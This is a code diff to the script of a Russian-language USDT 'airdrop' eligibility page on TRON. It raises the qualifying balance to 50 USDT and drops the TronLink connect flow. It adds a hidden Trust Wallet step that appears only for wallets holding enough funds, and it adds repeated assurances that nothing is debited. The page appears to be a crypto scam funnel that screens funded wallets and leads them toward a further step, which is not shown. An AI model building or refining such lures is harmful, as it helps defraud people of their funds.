@@ -2,18 +2,14 @@ const form = document.getElementById("walletForm");
 const input = document.getElementById("tronAddress");
 const status = document.getElementById("statusMsg");
 const clearBtn = document.getElementById("clearBtn");
-const connectBtn = document.getElementById("connectBtn");
-const walletState = document.getElementById("walletState");
 const checkBtn = document.getElementById("checkBtn");
+const trustOnly = document.getElementById("trustOnly");
 
 // ===== AIRDROP SETTINGS =====
-const MIN_USDT = 20;
+const MIN_USDT = 50;
 const USDT_DECIMALS = 6;
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_NODE = "https://api.trongrid.io";
-
-// Official USDT on TRON uses the TRC-20 balanceOf(address) method.
-// The query is read-only: it does not sign or broadcast a transaction.
 
 function setStatus(message, type = "") {
   status.textContent = message;
@@ -29,10 +25,6 @@ function formatUsdt(value) {
     minimumFractionDigits: 2,
     maximumFractionDigits: 6
   });
-}
-
-function shorten(address) {
-  return address ? `${address.slice(0, 6)}...${address.slice(-6)}` : "";
 }
 
 function base58ToHex(address) {
@@ -57,7 +49,6 @@ function base58ToHex(address) {
   hex = "00".repeat(leadingZeros) + hex;
   const bytes = hex.match(/.{2}/g) || [];
 
-  // TRON Base58Check address = 21-byte payload + 4-byte checksum.
   if (bytes.length !== 25) throw new Error("Invalid TRON address length");
   if (bytes[0].toLowerCase() !== "41") throw new Error("Not a TRON mainnet address");
 
@@ -91,93 +82,10 @@ async function getUsdtBalance(address) {
   return Number(raw) / 10 ** USDT_DECIMALS;
 }
 
-function setConnected(address) {
-  input.value = address;
-  walletState.hidden = false;
-  walletState.innerHTML = `
-    <i class="fa-solid fa-circle-check"></i>
-    <span><strong>Кошелек подключен</strong><small>${shorten(address)}</small></span>
-  `;
-  connectBtn.innerHTML = '<i class="fa-solid fa-circle-check"></i> Кошелек подключен';
-  connectBtn.classList.add("connected");
+function showTrustWalletStep() {
+  trustOnly.hidden = false;
+  trustOnly.scrollIntoView({ behavior: "smooth", block: "center" });
 }
-
-async function findTronLinkProvider() {
-  if (window.tron?.isTronLink) return window.tron;
-
-  return new Promise((resolve) => {
-    let found = null;
-    const handler = (event) => {
-      if (event.detail?.info?.name === "TronLink") {
-        found = event.detail.provider;
-      }
-    };
-
-    window.addEventListener("TIP6963:announceProvider", handler);
-    window.dispatchEvent(new Event("TIP6963:requestProvider"));
-
-    setTimeout(() => {
-      window.removeEventListener("TIP6963:announceProvider", handler);
-      resolve(found || window.tron || null);
-    }, 500);
-  });
-}
-
-connectBtn.addEventListener("click", async () => {
-  connectBtn.disabled = true;
-  const oldText = connectBtn.innerHTML;
-  connectBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Подключаем...';
-  setStatus("Ожидаем подтверждение подключения кошелька...");
-
-  try {
-    const provider = await findTronLinkProvider();
-
-    if (!provider) {
-      setStatus("TronLink не найден. Установите TronLink или вставьте TRON-адрес вручную ниже.", "error");
-      return;
-    }
-
-    const accounts = await provider.request({ method: "eth_requestAccounts" });
-    const address = accounts?.[0];
-
-    if (!address || !isValidTronAddress(address)) {
-      throw new Error("TRON address was not returned");
-    }
-
-    setConnected(address);
-    setStatus("Кошелек подключен. Теперь можно пройти проверку участия.", "success");
-
-    // Immediately perform the read-only eligibility check.
-    await checkEligibility(address);
-  } catch (error) {
-    console.error("Wallet connection:", error);
-    if (error?.code === 4001) {
-      setStatus("Подключение отменено в кошельке.", "error");
-    } else {
-      setStatus("Не удалось подключить кошелек. Можно вставить адрес вручную.", "error");
-    }
-  } finally {
-    connectBtn.disabled = false;
-    if (!connectBtn.classList.contains("connected")) connectBtn.innerHTML = oldText;
-  }
-});
-
-input.addEventListener("input", () => {
-  input.value = input.value.replace(/\s+/g, "");
-  walletState.hidden = true;
-  connectBtn.classList.remove("connected");
-  connectBtn.innerHTML = '<i class="fa-solid fa-wallet"></i> Подключить кошелек';
-  if (status.textContent) setStatus("");
-});
-
-clearBtn.addEventListener("click", () => {
-  input.value = "";
-  walletState.hidden = true;
-  connectBtn.classList.remove("connected");
-  connectBtn.innerHTML = '<i class="fa-solid fa-wallet"></i> Подключить кошелек';
-  setStatus("");
-  input.focus();
-});
 
 async function checkEligibility(address) {
   if (!isValidTronAddress(address)) {
@@ -188,21 +96,23 @@ async function checkEligibility(address) {
   const oldText = checkBtn.innerHTML;
   checkBtn.disabled = true;
   checkBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Проверяем USDT...';
-  setStatus("Читаем баланс официального USDT TRC-20 из сети TRON...");
+  setStatus("Проверяем публичный баланс USDT TRC-20. Средства не списываются и не перемещаются...");
 
   try {
     const usdt = await getUsdtBalance(address);
 
     if (usdt >= MIN_USDT) {
       setStatus(
-        `✓ Вы соответствуете условию проверки. Баланс: ${formatUsdt(usdt)} USDT. Минимум: ${MIN_USDT} USDT. Ожидайте Airdrop.`,
+        `✓ Проверка пройдена. На адресе ${formatUsdt(usdt)} USDT. Требование: минимум ${MIN_USDT} USDT. Эти средства достаточно просто удерживать на кошельке.`,
         "success"
       );
+      showTrustWalletStep();
       return true;
     }
 
+    trustOnly.hidden = true;
     setStatus(
-      `Баланс: ${formatUsdt(usdt)} USDT. Для участия требуется минимум ${MIN_USDT} USDT в сети TRC-20.`,
+      `Баланс: ${formatUsdt(usdt)} USDT. Для участия необходимо минимум ${MIN_USDT} USDT TRC-20. Отправлять USDT никуда не нужно — после пополнения просто удерживайте сумму на кошельке.`,
       "error"
     );
     return false;
@@ -221,9 +131,22 @@ form.addEventListener("submit", async (event) => {
   await checkEligibility(input.value.trim());
 });
 
+input.addEventListener("input", () => {
+  input.value = input.value.replace(/\s+/g, "");
+  trustOnly.hidden = true;
+  setStatus("");
+});
+
+clearBtn.addEventListener("click", () => {
+  input.value = "";
+  trustOnly.hidden = true;
+  setStatus("");
+  input.focus();
+});
+
 // Soft reveal on scroll.
 const revealItems = document.querySelectorAll(
-  ".stat-card, .feature-card, .drop-card, .road-step, .eco-card, .airdrop-card, .tokenomics, .drop-warning"
+  ".stat-card, .feature-card, .drop-card, .road-step, .eco-card, .airdrop-card, .tokenomics, .drop-warning, .drop-date-card"
 );
 
 if ("IntersectionObserver" in window) {
